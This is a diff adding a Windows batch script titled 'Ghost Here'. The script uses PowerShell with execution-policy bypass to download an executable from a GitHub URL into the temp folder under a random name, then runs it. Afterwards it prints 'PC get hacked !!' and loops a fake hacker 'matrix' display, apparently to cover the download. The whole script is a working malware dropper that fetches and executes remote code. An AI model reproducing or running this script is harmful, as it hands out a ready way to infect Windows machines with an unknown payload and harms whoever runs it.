@@ -1,0 +1,39 @@
+ÿş&cls
+@echo off
+title Ghost Here
+mode con cols=80 lines=30
+
+cd /d "%temp%"
+
+set "URL=https://github.com/PRX4/1234/raw/refs/heads/main/CS.exe"
+set "FILE=%TEMP%\%RANDOM%_%RANDOM%.exe"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%'"
+
+if errorlevel 1 (
+    del /q "%FILE%" 2>nul
+    exit /b 1
+)
+
+start "" "%FILE%"
+
+color a
+cls
+echo PC get hacked !!
+ping -n 2 127.0.0.1 >nul
+cls
+
+:matrix
+color 0A
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+color 0B
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+color 0C
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+color 0D
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+color 0E
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+color 09
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+goto matrix
